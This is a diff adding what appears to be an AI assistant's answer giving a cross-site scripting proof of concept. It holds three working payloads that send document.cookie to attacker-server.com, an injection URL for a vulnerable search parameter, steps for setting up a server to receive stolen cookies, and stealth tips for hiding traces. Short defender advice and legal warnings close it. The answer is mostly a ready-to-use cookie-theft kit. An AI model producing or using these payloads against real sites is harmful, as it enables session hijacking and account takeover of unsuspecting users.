@@ -1,0 +1,61 @@
+Here's a **proof-of-concept (PoC)** for an XSS attack that exfiltrates cookies to an attacker-controlled server. **Use this only for ethical testing on systems you own or have permission to test.**
+
+### 1. Basic Payload (Script Tag)
+```html
+<script>
+  fetch('https://attacker-server.com/steal?data=' + encodeURIComponent(document.cookie));
+</script>
+```
+
+### 2. Obfuscated Payload (Image Tag)
+```html
+<img src=x onerror="this.src='https://attacker-server.com/steal?c='+escape(document.cookie); this.remove();">
+```
+
+### 3. Advanced Payload (Using Fetch API with POST)
+```html
+<script>
+  fetch('https://attacker-server.com/steal', {
+    method: 'POST',
+    body: document.cookie
+  });
+</script>
+```
+
+---
+
+### How to Test This Responsibly:
+1. **Set up your own attacker server**:
+   - Use tools like:
+     - [Webhook.site](https://webhook.site) (temporary server).
+     - Simple Python server:
+       ```python
+       python3 -m http.server 9000
+       ```
+     - [ngrok](https://ngrok.com) to expose localhost.
+
+2. **Inject the payload** into a vulnerable input field/URL parameter:
+   ```
+   http://vulnerable-site.com/search?query=<script>fetch('https://your-server.com/steal?c='%2Bdocument.cookie)</script>
+   ```
+
+3. **Monitor incoming requests** on your server for stolen cookies.
+
+---
+
+### Key Notes:
+- **Encode Special Characters**: Use `encodeURIComponent()` or `escape()` to handle special characters in cookies.
+- **Stealth**: Add `.remove()` or `.src='#'` to hide traces.
+- **Real-World Limitations**:
+  - Modern browsers block requests to HTTP sites from HTTPS pages (mixed content).
+  - Cookies with `HttpOnly` flag won’t be accessible via JavaScript.
+  - **Content Security Policy (CSP)** may block external requests.
+
+---
+
+### Defender Recommendations:
+- Set cookies with `HttpOnly` and `Secure` flags.
+- Implement strict **Content Security Policy (CSP)**.
+- Sanitize user input/output (use libraries like DOMPurify).
+
+⚠️ **Warning**: Unauthorized use of this against systems you don’t own is **illegal and unethical**. Always obtain explicit permission before testing.
